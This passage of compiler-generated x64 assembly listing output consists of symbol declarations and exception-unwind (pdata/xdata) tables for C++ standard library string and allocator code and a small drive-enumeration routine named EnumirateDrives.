PUBLIC	??0bad_array_new_length@std@@QEAA@XZ		; std::bad_array_new_length::bad_array_new_length
PUBLIC	??1bad_alloc@std@@UEAA@XZ			; std::bad_alloc::~bad_alloc
PUBLIC	??_Gbad_alloc@std@@UEAAPEAXI@Z			; std::bad_alloc::`scalar deleting destructor'
PUBLIC	??0bad_alloc@std@@AEAA@QEBD@Z			; std::bad_alloc::bad_alloc
PUBLIC	??_Gexception@std@@UEAAPEAXI@Z			; std::exception::`scalar deleting destructor'
PUBLIC	?what@exception@std@@UEBAPEBDXZ			; std::exception::what
PUBLIC	??1exception@std@@UEAA@XZ			; std::exception::~exception
PUBLIC	??0exception@std@@QEAA@AEBV01@@Z		; std::exception::exception
PUBLIC	??0exception@std@@QEAA@QEBDH@Z			; std::exception::exception
PUBLIC	?max@?$numeric_limits@_J@std@@SA_JXZ		; std::numeric_limits<__int64>::max
PUBLIC	??2@YAPEAX_KPEAX@Z				; operator new
EXTRN	??_Eexception@std@@UEAAPEAXI@Z:PROC		; std::exception::`vector deleting destructor'
EXTRN	??_Ebad_alloc@std@@UEAAPEAXI@Z:PROC		; std::bad_alloc::`vector deleting destructor'
EXTRN	??_Ebad_array_new_length@std@@UEAAPEAXI@Z:PROC	; std::bad_array_new_length::`vector deleting destructor'
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD imagerel $LN17
	DD	imagerel $LN17+58
	DD	imagerel $unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD imagerel $LN7
	DD	imagerel $LN7+34
	DD	imagerel $unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD imagerel $LN24
	DD	imagerel $LN24+88
	DD	imagerel $unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD imagerel $LN31
	DD	imagerel $LN31+107
	DD	imagerel $unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD imagerel $LN34
	DD	imagerel $LN34+109
	DD	imagerel $unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD imagerel $LN42
	DD	imagerel $LN42+130
	DD	imagerel $unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD imagerel $LN17
	DD	imagerel $LN17+52
	DD	imagerel $unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD imagerel $LN90
	DD	imagerel $LN90+39
	DD	imagerel $unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD imagerel $LN90+39
	DD	imagerel $LN90+348
	DD	imagerel $chain$2$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD imagerel $LN90+348
	DD	imagerel $LN90+354
	DD	imagerel $chain$4$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD imagerel $LN90+354
	DD	imagerel $LN90+360
	DD	imagerel $chain$5$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$6$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD imagerel $LN90+360
	DD	imagerel $LN90+366
	DD	imagerel $chain$6$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN4
	DD	imagerel $LN4+26
	DD	imagerel $unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD imagerel $LN20
	DD	imagerel $LN20+62
	DD	imagerel $unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD imagerel $LN4
	DD	imagerel $LN4+26
	DD	imagerel $unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD imagerel $LN23
	DD	imagerel $LN23+66
	DD	imagerel $unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z DD imagerel $LN6
	DD	imagerel $LN6+48
	DD	imagerel $unwind$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD imagerel $LN14
	DD	imagerel $LN14+18
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD imagerel $LN14+18
	DD	imagerel $LN14+84
	DD	imagerel $chain$1$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD imagerel $LN14+84
	DD	imagerel $LN14+100
	DD	imagerel $chain$2$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z DD imagerel $LN20
	DD	imagerel $LN20+39
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z DD imagerel $LN20+39
	DD	imagerel $LN20+108
	DD	imagerel $chain$1$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z DD imagerel $LN20+108
	DD	imagerel $LN20+118
	DD	imagerel $chain$2$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD imagerel $LN32
	DD	imagerel $LN32+97
	DD	imagerel $unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD imagerel $LN36
	DD	imagerel $LN36+97
	DD	imagerel $unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z DD imagerel $LN22
	DD	imagerel $LN22+39
	DD	imagerel $unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z DD imagerel $LN22+39
	DD	imagerel $LN22+108
	DD	imagerel $chain$1$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z DD imagerel $LN22+108
	DD	imagerel $LN22+118
	DD	imagerel $chain$2$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z DD imagerel $LN209
	DD	imagerel $LN209+116
	DD	imagerel $unwind$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z DD imagerel $LN209+116
	DD	imagerel $LN209+567
	DD	imagerel $chain$1$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z DD imagerel $LN209+567
	DD	imagerel $LN209+906
	DD	imagerel $chain$2$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetLogicalDriveStringsW@@YAKKPEA_W@Z DD imagerel $LN4
	DD	imagerel $LN4+53
	DD	imagerel $unwind$?pGetLogicalDriveStringsW@@YAKKPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrlenW@@YAHPEB_W@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?plstrlenW@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlen_string@std@@YAXXZ DD imagerel $LN4
	DD	imagerel $LN4+17
	DD	imagerel $unwind$?_Xlen_string@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD imagerel $LN13
	DD	imagerel $LN13+42
	DD	imagerel $unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_alloc@std@@QEAA@AEBV01@@Z DD imagerel $LN7
	DD	imagerel $LN7+60
	DD	imagerel $unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD imagerel $LN9
	DD	imagerel $LN9+60
	DD	imagerel $unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Throw_bad_array_new_length@std@@YAXXZ DD imagerel $LN4
	DD	imagerel $LN4+32
	DD	imagerel $unwind$?_Throw_bad_array_new_length@std@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD imagerel $LN14
	DD	imagerel $LN14+66
	DD	imagerel $unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gbad_alloc@std@@UEAAPEAXI@Z DD imagerel $LN12
	DD	imagerel $LN12+66
	DD	imagerel $unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gexception@std@@UEAAPEAXI@Z DD imagerel $LN9
	DD	imagerel $LN9+66
	DD	imagerel $unwind$??_Gexception@std@@UEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0exception@std@@QEAA@AEBV01@@Z DD imagerel $LN4
	DD	imagerel $LN4+50
	DD	imagerel $unwind$??0exception@std@@QEAA@AEBV01@@Z
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0exception@std@@QEAA@AEBV01@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gexception@std@@UEAAPEAXI@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_alloc@std@@UEAAPEAXI@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gbad_array_new_length@std@@UEAAPEAXI@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Throw_bad_array_new_length@std@@YAXXZ DD 010401H
	DD	08204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_array_new_length@std@@QEAA@AEBV01@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0bad_alloc@std@@QEAA@AEBV01@@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Xlen_string@std@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrlenW@@YAHPEB_W@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pGetLogicalDriveStringsW@@YAKKPEA_W@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z DD 021H
	DD	imagerel $LN209
	DD	imagerel $LN209+116
	DD	imagerel $unwind$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z DD 041321H
	DD	0ad413H
	DD	0146408H
	DD	imagerel $LN209
	DD	imagerel $LN209+116
	DD	imagerel $unwind$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z DD 071101H
	DD	0f00aa211H
	DD	0c006e008H
	DD	030037004H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z DD 021H
	DD	imagerel $LN22
	DD	imagerel $LN22+39
	DD	imagerel $unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z DD 040a21H
	DD	07640aH
	DD	063405H
	DD	imagerel $LN22
	DD	imagerel $LN22+39
	DD	imagerel $unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z DD 020601H
	DD	070023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z DD 021H
	DD	imagerel $LN20
	DD	imagerel $LN20+39
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z DD 040a21H
	DD	07640aH
	DD	063405H
	DD	imagerel $LN20
	DD	imagerel $LN20+39
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z DD 020601H
	DD	070023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD 021H
	DD	imagerel $LN14
	DD	imagerel $LN14+18
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD 040a21H
	DD	07640aH
	DD	063405H
	DD	imagerel $LN14
	DD	imagerel $LN14+18
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD 020601H
	DD	070023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$6$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD 060021H
	DD	04c400H
	DD	057400H
	DD	065400H
	DD	imagerel $LN90
	DD	imagerel $LN90+39
	DD	imagerel $unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD 021H
	DD	imagerel $LN90
	DD	imagerel $LN90+39
	DD	imagerel $unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD 060021H
	DD	04c400H
	DD	057400H
	DD	065400H
	DD	imagerel $LN90
	DD	imagerel $LN90+39
	DD	imagerel $unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD 061721H
	DD	04c417H
	DD	057412H
	DD	065405H
	DD	imagerel $LN90
	DD	imagerel $LN90+39
	DD	imagerel $unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD 050b01H
